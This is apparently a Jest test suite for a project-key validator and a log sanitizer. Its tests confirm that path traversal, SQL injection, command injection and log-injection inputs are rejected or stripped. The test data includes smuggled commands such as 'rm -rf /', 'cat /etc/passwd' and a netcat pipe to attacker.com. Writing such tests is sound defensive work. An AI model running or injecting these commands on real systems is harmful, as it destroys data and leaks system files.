import { validateProjectKey, sanitizeForLogging } from '../../../src/infrastructure/utils/validation';

describe('Security Validation Tests', () => {
    describe('validateProjectKey', () => {
        describe('Valid inputs', () => {
            it('should accept valid alphanumeric project keys', () => {
                expect(validateProjectKey('PROJ123')).toBe('PROJ123');
                expect(validateProjectKey('my-project')).toBe('my-project');
                expect(validateProjectKey('MY_PROJECT')).toBe('MY_PROJECT');
                expect(validateProjectKey('ABC-123_XYZ')).toBe('ABC-123_XYZ');
            });

            it('should return undefined for undefined input', () => {
                expect(validateProjectKey(undefined)).toBeUndefined();
            });

            it('should trim whitespace', () => {
                expect(validateProjectKey('  PROJ  ')).toBe('PROJ');
                expect(validateProjectKey('\tPROJ\n')).toBe('PROJ');
            });
        });

        describe('Path traversal attacks', () => {
            it('should reject path traversal with double dots', () => {
                expect(() => validateProjectKey('../../../etc/passwd')).toThrow('path traversal attempt detected');
                expect(() => validateProjectKey('PROJ/../admin')).toThrow('path traversal attempt detected');
                expect(() => validateProjectKey('..')).toThrow('path traversal attempt detected');
            });

            it('should reject paths with forward slashes', () => {
                expect(() => validateProjectKey('PROJ/admin')).toThrow('path traversal attempt detected');
                expect(() => validateProjectKey('/etc/passwd')).toThrow('path traversal attempt detected');
                expect(() => validateProjectKey('admin/secrets')).toThrow('path traversal attempt detected');
            });

            it('should reject paths with backslashes', () => {
                expect(() => validateProjectKey('PROJ\\admin')).toThrow('path traversal attempt detected');
                expect(() => validateProjectKey('C:\\Windows\\System32')).toThrow('path traversal attempt detected');
            });
        });

        describe('Injection attacks', () => {
            it('should reject SQL injection attempts', () => {
                expect(() => validateProjectKey("PROJ'; DROP TABLE--")).toThrow('Invalid project key format');
                expect(() => validateProjectKey("PROJ' OR '1'='1")).toThrow('Invalid project key format');
            });

            it('should reject command injection attempts', () => {
                expect(() => validateProjectKey('PROJ; rm -rf /')).toThrow('Invalid project key format');
                expect(() => validateProjectKey('PROJ && cat /etc/passwd')).toThrow('Invalid project key format');
                expect(() => validateProjectKey('PROJ | nc attacker.com 1234')).toThrow('Invalid project key format');
            });

            it('should reject special characters', () => {
                expect(() => validateProjectKey('PROJ@#$%')).toThrow('Invalid project key format');
                expect(() => validateProjectKey('PROJ<script>')).toThrow('Invalid project key format');
                expect(() => validateProjectKey('PROJ{test}')).toThrow('Invalid project key format');
            });
        });

        describe('DoS protection', () => {
            it('should reject empty strings', () => {
                expect(() => validateProjectKey('')).toThrow('Project key cannot be empty');
                expect(() => validateProjectKey('   ')).toThrow('Project key cannot be empty');
            });

            it('should reject excessively long strings', () => {
                const longString = 'A'.repeat(256);
                expect(() => validateProjectKey(longString)).toThrow('Project key too long');
            });

            it('should accept maximum allowed length', () => {
                const maxString = 'A'.repeat(255);
                expect(validateProjectKey(maxString)).toBe(maxString);
            });
        });

        describe('Edge cases', () => {
            it('should handle single character keys', () => {
                expect(validateProjectKey('A')).toBe('A');
                expect(validateProjectKey('1')).toBe('1');
            });

            it('should handle mixed case', () => {
                expect(validateProjectKey('MyProject')).toBe('MyProject');
                expect(validateProjectKey('my-PROJECT-123')).toBe('my-PROJECT-123');
            });
        });
    });

    describe('sanitizeForLogging', () => {
        it('should remove newlines', () => {
            expect(sanitizeForLogging('line1\nline2')).toBe('line1line2');
            expect(sanitizeForLogging('line1\r\nline2')).toBe('line1line2');
        });

        it('should remove tabs', () => {
            expect(sanitizeForLogging('col1\tcol2')).toBe('col1col2');
        });

        it('should remove control characters', () => {
            expect(sanitizeForLogging('test\x00null')).toBe('testnull');
            expect(sanitizeForLogging('test\x1Funit')).toBe('testunit');
        });

        it('should preserve normal text', () => {
            expect(sanitizeForLogging('Normal text 123')).toBe('Normal text 123');
            expect(sanitizeForLogging('Project-Name_123')).toBe('Project-Name_123');
        });

        it('should prevent log injection', () => {
            const malicious = 'User input\nINFO: Fake log entry';
            expect(sanitizeForLogging(malicious)).toBe('User inputINFO: Fake log entry');
        });
    });
});
